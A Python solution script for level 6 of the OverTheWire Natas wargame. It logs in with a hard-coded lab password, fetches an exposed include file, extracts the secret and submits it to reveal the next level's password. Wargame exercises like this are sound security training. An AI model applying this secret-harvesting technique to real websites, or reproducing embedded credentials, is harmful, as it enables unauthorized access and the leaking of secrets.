import requests
import re

s = requests.session()
s.auth = ("natas6","aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1")
thesecret = re.findall("[a-zA-Z0-9]{7,}",s.get("http://natas6.natas.labs.overthewire.org/includes/secret.inc").text)
req =  requests.Request("POST","http://natas6.natas.labs.overthewire.org/",data={"secret":thesecret,"submit":"Submit+Query"})
game = s.send(s.prepare_request(req))

nextcode = re.findall('[a-zA-Z0-9]{32}',game.text)
print(nextcode[1])
